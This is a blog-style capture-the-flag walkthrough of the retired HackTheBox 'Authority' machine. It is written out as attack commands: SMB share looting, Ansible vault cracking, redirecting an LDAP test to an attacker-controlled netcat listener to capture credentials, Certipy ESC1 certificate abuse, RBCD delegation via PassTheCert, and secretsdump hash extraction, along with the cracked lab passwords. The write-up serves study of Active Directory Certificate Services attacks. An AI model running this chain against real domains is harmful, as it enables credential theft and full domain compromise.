---
layout: page
sitemap: true
image: /assets/img/Authority.png
---

<!--Adds the glitch effect -->
<section>

  <link rel="stylesheet" href="/style.css">
  <div class="hero-container">
	<h1 class="hero glitch layers" data-text="Authority" style="position: absolute; top: 0px; left: 0px; margin-top: 0px;">
  	<span>Authority</span></h1>
  </div>

</section>
<!--this css code will fix all color issues -->
<link rel="stylesheet" href="/hydejack-9.1.6.css">

<div class="image-container">
  <img src="/assets/img/Authority.png" alt="Authority Logo" class="competition-image">
</div>

<style>
.image-container {
  margin-top: 40px; /* Adjust the value as needed to create space below the title */
  text-align: center; /* Centers the image, optional */
}

.normal-photo {
  margin-top: 20px;
  margin-bottom: 20px;
  text-align: center; /* Centers the image, optional */
}

.competition-image {
  max-width: 100%; /* Ensures the image is responsive */
  height: auto;
}

body {
  background-color: #2b2b2b;
}
</style>

* this text will be replaced
{:toc}

## Overview
---

This is a medium box rated box that is already retired. This means that normal users will not be able to access this machine (assumably). This box goes over interesting topics such as Certificate Authority (CA), Active Directory Certificate Services (AD CS), Ansible hashes, certipy, PassTheCert tool, Kerberos, and impersonation. 

This is interesting because in the 2024 ITC competition, there was a CA machine that we compromised, but didn't know what to do with. Granted we used Zerologon to gain root, but this would've been a great find to add on the report. It's definitely something I will look for in future pentests.

## Information Gathering
---

We start off with the typical namp scan using the flags -sV -sC. This gave us the following information:

<div class="normal-photo">
  <img src="/assets/img/Authority-nmap.jpeg" alt="nmap scan" class="competition-image">
</div>

We find the domain of the server in the nmap scan and immediately add it to our /etc/hosts file. With this, our machine will be able to resolve to the authority.htb domain. {:.note title="Important"}

I noticed that it was running a website, so I tried to visit it. However it was essentially a blank website that led to an actual microsoft website (probably). I didn't want to take the risk so I just left the website alone. This was the same as ITC's CA machine under the RND network, so I got interested when I saw this website. 

The next thing I tried was anonymous login through rpcclient. This is because if misconfigrued, you can enumerate all of the users. However, in hindsight I don't think this would work anyways because the machine isn't a DC, but I could be wrong. Anyways, the permissions were correctly configured so this attempt didn't work.

Finally, I tried anonymous login through smbclient by running the command:

~~~bash
smbclient -L //10.10.11.222/ -U ""
~~~

There are multiple ways of doing anonymous login, but this is how I do it. Anyways we then see that there are unusual shares on this server name "Development" and "Department Shares". Seeing as they're unusual shares and anonymous login is enabled, I tried to login to each share

~~~bash
smbclient //10.10.11.222/'Department Shares' -U ""
smbclient //10.10.11.222/Development -U ""
~~~

The login for the Department Shares was a failure, however the login for the Development share was a success. I then looked around the directory and figured these are all important. So I recursively downloaded all of the files from the share. Now I didn't actually need all of the files, I just needed the PWM directory.

~~~bash
smbclient '\\10.10.11.222\Development' -N -c 'prompt OFF;recurse ON;cd 'automation\ansible';lcd '~';mget *'`
~~~
Here's the link to the code https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient {:.figcaption}

## Password Cracking
---

After a lot of searching and some help through the guided mode, I found out there were ansible hashes stored in the /Automation/Ansible/PWM/defaults/main.yml file. First I remove the blank spaces within the hash by using an online tool. I then added each hash into their own file. (make sure there is a new line between AES256 and the hash)

Here's an example:
~~~
$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
~~~

After this we have to turn the Ansible hash into a hash that john the ripper or hashcat can crack. To do this we can run the following commands:

~~~bash
ansible2john (file) > (new file)
john --format=ansible (new file) /usr/share/wordlists/rockyou.txt
~~~

If done correcty we will get the password: !@#$%^&*

If you want to do the hashcat way, you can look at the hashcat examples that list all of the hash types that hashcat can crack and select the appropriate mode. I like using john the ripper, so I chose that route. 

So what do we do with this password? Well we can now crack the Ansible hash with the ansible-vault command. However, this command isn't installed by default on Kali Linux. So to install it, we have to run: 

~~~bash
sudo apt install ansible-core

# Once it's installed, we can then decrypt the ansible hashes by running:
cat (ansible file) | ansible-vault decrypt
# Password: !@#$%^&*
~~~

When you crack the pwm_admin_password ansible hash, you will get this: "pWm_@dm!N_!23". You can ignore the other two hashes. They aren't used anywhere in this box. 

## Initial Access
---

Now that we have the admin password, where do we use it?

I referred to the guided mode and found out we had to go to 'https://10.10.11.222:8443'. Here we find that there is a private login page and options to go to the configuration manager/editor. This is a big find especially since when we go to the configuration editor, we don't need to specify a username. It only asks for a password. 

<div class="normal-photo">
  <img src="/assets/img/Authority-login.jpeg" alt="login page" class="competition-image">
</div>

So, logically we use the ansible password we cracked earlier and we're able to login. We're then met with a heirarchy like side bar. When we click around, we see an interesting section under LDAP > LDAP Directories > default > Connection. 

<div class="normal-photo">
  <img src="/assets/img/Authority-connection.jpeg" alt="connection tab" class="competition-image">
</div>

This section has a place where we can specify LDAP URLs. We can see that by default, the url is pointing to the authority.authority.htb domain on port 636. But what if we add or change it so that it connects to our ip address? We can do that with this:

~~~bash
# In the section url section:
ldap://10.10.14.29:4444

# On your Kali machine:
nc -lvp 4444
~~~

You may notice that the URLs are slightly differnt between the "ldap:" section. We want to use ldap because we want an unencrypted version of whatever information they send to us. If we were to use ldaps, all of the data would be encrypted and useless to us. You can think of this as http vs https protocols.

So, we hit the "Test LDAP Profile" button at the very top and upon succession, we see that we get credentials. svc_ldap:lDaP_1n_th3_cle4r!

From my interpretation of this, there's a preconfigured profile that has credentials. These credentials are being sent to the LDAP service running on the machine (10.10.11.222) to test whether authentication to a service is successful or not. However, by adding our own ip to the LDAP URLs, the website is also sending credentials to us in clear text because we specified LDAP and not LDAPS. There's probably more going on in the background, but this is essentially what's going on. 

Now with these credentials, we're able to evil-winrm into the svc_ldap user. I guessed this becasue the port for winrm (5985) was open. This was not shown in the nmap scan earlier, but a quick port scan will show that it is open. 

~~~bash
evil-winrm -u svc_ldap -p lDaP_1n_th3_cle4r! -i 10.10.11.222
~~~

Like all other HTB labs, if we go to the desktop of the user, we will find the user flag. 

## Privesc
---

This is my favorite part because I think it's really interesting in how you impersonate the Administrator using tools like certipy. By default, certipy is installed on Kali Linux, however it's named certipy-ad. It does the same thing, just a different name. One thing you will need to download is "ntpdate". This is just a simple "sudo apt install" command, but you will most likely need this because of how kerberos uses timestamps for their tickets. (I will make a post about kerberos in the future)

We already know/assume that this machine is a Windows CA computer, so what we can do is use a tool called Certipy by Oliver Lyak (ly4k). This is a powerful tool designed to abuse certificate misconfigurations. This is possible because certificates use templates to simplify the task of administering certificates. It's like using a Jekyll template for your website like I am. However, with these templates, there may be misconfigurations such as dangerous permissions, which is what we'll be abusing. 

First, we can run the command:

~~~bash
# This logs into the svc_ldap user and searches for vulnerable certificate templates
certipy-ad find -u svc_ldap@authority.htb -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -vulnerable
~~~

After this is finished running we see the file "20240529162010_Certipy.txt". If we cat out this file, we see that the CorpVPN template allows Domain Computer enrollment rights. This is very bad because any computer can simply request a certificate and impersonate a user, which is what we'll do. 

If we scroll down further in the file we see that it's clearly vulnerable to ESC1. If we go to HackTricks' AD CS section, we see an example of how to abuse ESC1, but before we do this, we need to add a computer to the domain. This is needed because only Domain Computers have access to enrollment rights, but the svc_ldap user isn't a computer. By default, all users have the ability to add 10 computers to the domain. We don't know why but it is so. Now since we create the computer, we know the username and password. As a result, we can use the new computer's credentials to request certificates. This can all be done remotely from your Kali. 

~~~bash
# This checks whether the user has permissions to add computers. This is defined by the MachineAccountQuota (MAQ)
crackmapexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M MAQ

# this creates a new computer named "something$" and the password "wefwefwef" (the $ shows that it's a computer being created)
impacket-addcomputer -computer-name 'something$' -computer-pass 'wefwefwef' -dc-ip 10.10.11.222 -baseDN DC=authority,DC=htb 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -debug

# this saves a file named administrator.pfx (the file maybe named differently. It's a little weird.)
certipy-ad req -username something$ -password wefwefwef -target-ip authority.htb -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb' -debug

# We authenticate using the .pfx file to login as the administrator. 
certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'authority.htb' -dc-ip 10.10.11.222

# Run these commands if you get a clock skew error. This sets your clock to match the machine. 
timedatectl set-ntp 0
sudo ntpdate 10.10.11.222
~~~

This is where what happened to me differed from what happened in the walkthrough. There was supposed to be an error that occured when authenticating to the administrator user. 

~~~
KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
~~~

What this means is that the DC doesn't support Public Key Cryptography for initial authentication (PKINIT). PKINIT is a Kerberos mechanism where you can use certificates as a pre-authentication mechanism. [(source)](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html) Because this is disabled, we can't use certipy to authenticate to the administrator user with the .pfx file. However, I was able to authenticate and get the NT hash without having to work around this error. Because my way is boring, I'll show the way the walkthrough did it for education sake. 

What the walkthrough did was they extracted the .key and .crt files from the .pfx file that we created with the following commands:

~~~bash
# extracts the .key file
openssl pkcs12 -in administrator_authority.pfx -nocerts -out administrator.key
# extracts the .crt file
openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out administrator.crt
~~~

It then used a python tool called PassTheCert by AlmondOffSec. What they do is they use the files we extracted to "authenticate" and use administrator privileges (most likely because that's the user we requested the certificate for). Then we modify the computer we created to have RBCD or delegation rights over the DC. Now, because the computer we own has RBCD (delegation) rights, we can impersonate the Administrator user because our "something$" computer is trusted to act on behalf of other users. 

~~~bash
# This uses the administrator's privilege (presumably) to modify the "something$" computer to have delegation rights. 
python3 ./Python/passthecert.py -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'something$'

# this command impersonates the Administrator user to grab the TGT. This should output a .ccache file
impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/something$:wefwefwef'

# We export the KRB5CCNAME variable because that is used when authenticating over kerberos. 
# We're also dumping the NTLM hashes with secretsdump, which we can use to login as Administrator
export KRB5CCNAME=(path to .ccache file)
impacket-secretsdump -k -no-pass authority.htb/Administrator@authority.authority.htb -just-dc-ntlm
~~~

You will then gain a NT hash which you can then pass the second half of into evil-winrm. Finally you gain admin privileges and you find the flag under the desktop directory under administrator.

Here's a picture to visualize what we did in the privesc: (this my interpretation of the privesc and maybe inaccurate)

<div class="normal-photo">
  <img src="/assets/img/Authority-privesc.jpeg" alt="connection tab" class="competition-image">
</div>